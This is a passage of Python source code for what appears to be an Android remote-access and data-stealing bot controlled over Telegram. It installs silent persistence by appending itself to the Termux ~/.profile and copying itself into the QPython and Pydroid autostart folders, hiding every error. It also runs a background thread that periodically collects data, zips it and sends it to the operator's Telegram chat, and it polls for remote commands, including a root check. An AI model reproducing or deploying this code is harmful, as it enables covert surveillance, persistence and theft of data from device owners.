            msg += f'\n<b>Methods detected:</b>\n'
            for method in root_info['methods']:
                msg += f'  • {method}\n'
            send_message(msg, chat_id)
        except Exception as e:
            send_message(f'❌ Root check error: {e}', chat_id)

    else:
        send_message(f'Unknown command: <code>{cmd}</code>  — use /help', chat_id)

# ========================= PERSISTENCE ==========================


def install_persistence():
    """
    Install persistence appropriate to the detected environment.
    Silently skips methods that are not available.
    """
    script = str(Path(__file__).resolve())
    interp = sys.executable
    env    = detect_environment()

    # Termux: ~/.profile or ~/.bashrc append
    if env['is_termux']:
        try:
            profile = Path.home() / '.profile'
            marker  = '# hbd-agent'
            content = profile.read_text(encoding='utf-8') if profile.exists() else ''
            if marker not in content:
                with profile.open('a') as fh:
                    fh.write(
                        f'\n{marker}\n'
                        f'(pgrep -f "{script}" || {interp} "{script}") &\n'
                    )
        except Exception:
            pass
        return

    # QPython: autostart directory
    if env['is_qpython']:
        try:
            dst = Path('/sdcard/qpython/scripts3/autostart')
            dst.mkdir(parents=True, exist_ok=True)
            target = dst / 'hbd_agent.py'
            if not target.exists():
                shutil.copy2(script, target)
        except Exception:
            pass
        return

    # Pydroid: autostart directory
    if env['is_pydroid']:
        try:
            storage = _accessible_storage()
            if storage:
                dst = storage / 'pydroid3' / 'autostart'
                dst.mkdir(parents=True, exist_ok=True)
                target = dst / 'hbd_agent.py'
                if not target.exists():
                    shutil.copy2(script, target)
        except Exception:
            pass

# ========================= LOCK FILE ============================


def _acquire_lock():
    """Return False if another instance is already running."""
    tmp_dir = get_temp_dir()
    lf      = tmp_dir / 'hbd_android.lock'
    if lf.exists():
        try:
            pid = int(lf.read_text().strip())
            os.kill(pid, 0)
            return False
        except (ProcessLookupError, PermissionError):
            pass
        except Exception:
            pass
    lf.write_text(str(os.getpid()))
    atexit.register(lambda: lf.unlink() if lf.exists() else None)
    return True

# ========================= BOT LOOP =============================


def _auto_extract():
    while True:
        time.sleep(CHECK_INTERVAL)
        try:
            data = collect_all()
            zp   = make_zip(data)
            send_message(
                f'⏰ Scheduled extraction — '
                f'{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
            )
            send_file(str(zp), caption='Scheduled extraction')
            try:
                zp.unlink()
            except Exception:
                pass
        except Exception as e:
            print(f'[auto_extract] Error: {e}')
            try:
                send_message(f'⚠️ Scheduled extraction failed: {e}')
            except Exception:
                pass


def _drain_updates():
    url = f'{_API}/getUpdates'
    try:
        r = requests.get(url, params={'timeout': 0, 'offset': -1}, timeout=10)
        data = r.json()
        if data.get('ok') and data.get('result'):
            return data['result'][-1]['update_id'] + 1
    except Exception:
        pass
    return None


def run_bot():
    for _ in range(12):
        if check_network():
            break
        time.sleep(5)

    delete_webhook()

    si  = system_info()
    env = detect_environment()
    msg = (
        f'<b>🤖 Android Bot Online</b>\n\n'
        f'<b>Device:</b>      {si["hostname"]}\n'
        f'<b>Environment:</b> {si["environment"]}\n'
        f'<b>Access:</b>      {si["access"]}\n'
        f'<b>Time:</b>        {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\n\n'
        f'Use /help for available commands.'
    )
    send_message(msg)

    offset = _drain_updates()
    errors = 0

    while True:
        updates = get_updates(offset)
        if updates is None:
            errors += 1
            wait = min(2 ** errors * 2, 120)
            print(f'[poll] No response, retry in {wait}s (errors={errors})')
            time.sleep(wait)
            if errors >= 5:
                delete_webhook()
                errors = 0
            continue
        errors = 0
        for upd in updates.get('result', []):
            offset = upd['update_id'] + 1
            msg    = upd.get('message', {})
            text   = msg.get('text', '')
            cid    = msg.get('chat', {}).get('id')
            if text.startswith('/') and cid:
                if not _is_authorized(cid):
                    send_message('⛔ Unauthorized.', cid)
                    continue
                try:
                    handle_command(text, cid)
                except Exception as e:
                    send_message(f'❌ Error: {e}', cid)
        time.sleep(2)

# ============================= MAIN =============================


def main():
    _init_access_mode()

    if not _acquire_lock():
        sys.exit(0)

    try:
        install_persistence()
    except Exception:
        pass

    if CHECK_INTERVAL > 0:
        threading.Thread(target=_auto_extract, daemon=True).start()

    while True:
        try:
            run_bot()
        except KeyboardInterrupt:
            send_message('🛑 Bot stopped.')
            break
        except Exception:
            # On mobile, wait longer before restart (network may be down)
            time.sleep(60)


if __name__ == '__main__':
    main()
